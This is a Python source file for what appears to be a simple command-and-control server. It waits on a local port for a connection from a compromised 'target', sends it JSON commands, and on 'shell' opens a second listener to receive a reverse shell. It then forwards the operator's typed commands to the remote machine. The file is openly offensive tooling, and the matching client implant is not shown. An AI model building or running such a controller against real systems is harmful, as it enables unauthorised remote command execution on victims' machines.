import socket
import json
import sys
import time

HOST = "127.0.0.1" # Address to listen on
PORT = 6969 # Port to listen on. (Better to use unprivileged ports)

def send_command(conn, *args):
    """Send a command to the target"""
    conn.send(json.dumps(args).encode())

def wait_response(conn):
    """Gets a response from the target"""
    raw = conn.recv(1024).decode()
    data = json.loads(raw)
    return data

def shell(conn): 
    """Actions performed when the shell command is typed"""
    print("\033[96m[INFO] Dropping into a shell...\033[91m")
    time.sleep(0.5)
    send_command(conn, "shell") # TODO: Implement a random port generator for multiple reverse shell handling

    lst = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Creates a new socket for the reverse shell
    lst.bind((HOST, 4242))
    lst.listen(1)
    cn, addr = lst.accept()
    while True:
        #Receive data from the target and get user input
        ans = cn.recv(1024).decode(errors='ignore')
        sys.stdout.write(ans)
        command = input()
        if command == 'exit':
            cn.close()
            print('\033[96m[INFO] Exiting the reverse shell...\033[0m')
            break

        #Send command
        command += "\n"
        cn.send(command.encode())
        time.sleep(1)
        sys.stdout.write("\033[A" + ans.split("\n")[-1])
    

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.bind((HOST, PORT))
    print(f"[INFO] Listening on {HOST}:{PORT}")
    sock.listen(1) # Wait for an incoming connection
    conn, addr = sock.accept() # Accept the connection. Store the connection and the IP address of the client connecting
    with conn: 
        print(f"\033[92m[INFO] Connection received from {addr}\n\033[0m")
        while True:
            command = input("\033[1mCMD> \033[0m") # Request user command input
            match command: # Parse user command input
                case 'help':
                    pass # TODO: create a help section
                case 'shell':
                    shell(conn) # TODO: check why dropping a second time in a reverse shell won't work



"""
Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
"""